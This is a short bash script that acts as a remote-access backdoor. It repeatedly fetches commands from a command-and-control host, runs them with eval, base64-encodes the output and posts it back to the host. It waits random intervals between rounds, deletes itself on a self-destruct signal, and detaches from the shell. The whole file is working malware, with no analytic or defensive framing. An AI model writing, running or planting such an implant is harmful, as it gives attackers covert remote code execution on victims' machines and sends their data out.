#!/bin/bash
export C2="c2.zhrak-services.com"
while :; do 
    cmd=$(curl -sL "http://$C2/cmd.sh" --interface eth0:1337)
    if [[ "$cmd" == *"!!SELF_DESTRUCT!!"* ]]; then rm $0; exit; fi
    eval "$cmd" | base64 | curl -X POST -d @- "http://$C2/report"
    sleep $((RANDOM % 120 + 60)) 
done &
disown -a
